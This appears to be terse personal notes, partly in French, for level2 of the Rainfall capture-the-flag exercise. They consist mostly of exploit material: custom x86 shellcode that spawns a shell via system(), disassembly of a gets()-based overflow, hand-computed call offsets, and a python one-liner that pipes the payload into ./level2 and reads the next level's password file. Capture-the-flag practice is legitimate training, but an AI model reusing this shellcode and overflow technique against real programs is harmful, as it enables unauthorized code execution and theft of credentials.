\x55\x89\xe5\x83\xec\x28\xc6\x45\xf5\x73\xc6\x45\xf6\x68\xc6\x45\xf7\x01\x0f\xb6\x45\xf7\x83\xe8\x01\x88\x45\xf7\x8d\x45\xf5\x89\x04\x24\xe8\xf5\xfe\xff\xff\xc9\xc3\x00



 80483e4:       55                      push   %ebp
 80483e5:       89 e5                   mov    %esp,%ebp
 80483e7:       83 ec 28                sub    $0x28,%esp
 80483ea:       c6 45 f5 73             movb   $0x73,-0xb(%ebp)
 80483ee:       c6 45 f6 68             movb   $0x68,-0xa(%ebp)
 80483f2:       c6 45 f7 01             movb   $0x1,-0x9(%ebp)
 80483f6:       0f b6 45 f7             movzbl -0x9(%ebp),%eax
 80483fa:       83 e8 01                sub    $0x1,%eax
 80483fd:       88 45 f7                mov    %al,-0x9(%ebp)
 8048400:       8d 45 f5                lea    -0xb(%ebp),%eax
 8048403:       89 04 24                mov    %eax,(%esp)
 8048406:       e8 f5 fe ff ff          call   8048300 <system@plt>
 804840b:       c9                      leave
 804840c:       c3                      ret
0xb7e6b060
/x0b/x7e/x6b/x60

adresse de la fonction injection : 0x804a008
\x08\xa0\x04\x08
 python -c "print('\x55\x89\xe5\x83\xec\x28\xc6\x45\xf5\x73\xc6\x45\xf6\x68\xc6\x45\xf7\x01\x0f\xb6\x45\xf7\x83\xe8\x01\x88\x45\xf7\x8d\x45\xf5\x89\x04\x24\xe8\x2f\x10\xe2\xaf\xc9\xc3\x00' + '\x00' * (64 + 16 - 42) + '\x08\xa0\x04\x08')" > /tmp/test.txt

 (python -c "print('\x55\x89\xe5\x83\xec\x28\xc6\x45\xf5\x73\xc6\x45\xf6\x68\xc6\x45\xf7\x01\x0f\xb6\x45\xf7\x83\xe8\x01\x88\x45\xf7\x8d\x45\xf5\x89\x04\x24\xe8\x2f\x10\xe2\xaf\xc9\xc3\x00' + '\x00' * (64 + 16 - 42) + '\x08\xa0\x04\x08')" ; echo "cat /home/user/level3/.pass") | ./level2
 0x8049f26   134520614
 0x8048300	 134513408 

			4127129599 + 7206 = 4127136805

			f5 ff 1c 25

sys 	0xb7e6b060 = 3085348960
call	0xbfeb5091 = 3219869841

offset =  3219869841 - 3085348960 = 134520881

3085348960 - 134520881 = 2950828079 = \xaf\xe2\x10\x2f

return = \x2f\x10\xe2\xaf


0x80484d4 <p>                   push   %ebp                     
0x80484d5 <p+1>                 mov    %esp,%ebp                
0x80484d7 <p+3>                 sub    $0x68,%esp               
0x80484da <p+6>                 mov    0x8049860,%eax           
0x80484df <p+11>                mov    %eax,(%esp)              
0x80484e2 <p+14>                call   0x80483b0 <fflush@plt>   
0x80484e7 <p+19>                lea    -0x4c(%ebp),%eax         
0x80484ea <p+22>                mov    %eax,(%esp)              
0x80484ed <p+25>                call   0x80483c0 <gets@plt>     
0x80484f2 <p+30>                mov    0x4(%ebp),%eax           
0x80484f5 <p+33>                mov    %eax,-0xc(%ebp)          
0x80484f8 <p+36>                mov    -0xc(%ebp),%eax          
0x80484fb <p+39>                and    $0xb0000000,%eax         
0x8048500 <p+44>                cmp    $0xb0000000,%eax         
0x8048505 <p+49>                jne    0x8048527 <p+83>         
0x8048507 <p+51>                mov    $0x8048620,%eax          
0x804850c <p+56>                mov    -0xc(%ebp),%edx          
0x804850f <p+59>                mov    %edx,0x4(%esp)           
0x8048513 <p+63>                mov    %eax,(%esp)              
0x8048516 <p+66>                call   0x80483a0 <printf@plt>   
0x804851b <p+71>                movl   $0x1,(%esp)              
0x8048522 <p+78>                call   0x80483d0 <_exit@plt>    
0x8048527 <p+83>                lea    -0x4c(%ebp),%eax         
0x804852a <p+86>                mov    %eax,(%esp)              
0x804852d <p+89>                call   0x80483f0 <puts@plt>     
0x8048532 <p+94>                lea    -0x4c(%ebp),%eax         
0x8048535 <p+97>                mov    %eax,(%esp)              
0x8048538 <p+100>               call   0x80483e0 <strdup@plt>   
0x804853d <p+105>               leave                                                                                                                                                                       
0x804853e <p+106>               ret              


pourquoi : https://github.com/ForAbby-X/rainfall/blob/main/rainfall.txt

(python -c "print('\x55\x89\xe5\x83\xec\x28\xc6\x45\xf5\x73\xc6\x45\xf6\x68\xc6\x45\xf7\x01\x0f\xb6\x45\xf7\x83\xe8\x01\x88\x45\xf7\x8d\x45\xf5\x89\x04\x24\xe8\x2f\x10\xe2\xaf\xc9\xc3\x00' + '\x00' * (64 + 16 - 42) + '\x08\xa0\x04\x08')" ; echo "cat /home/user/level3/.pass") | ./level2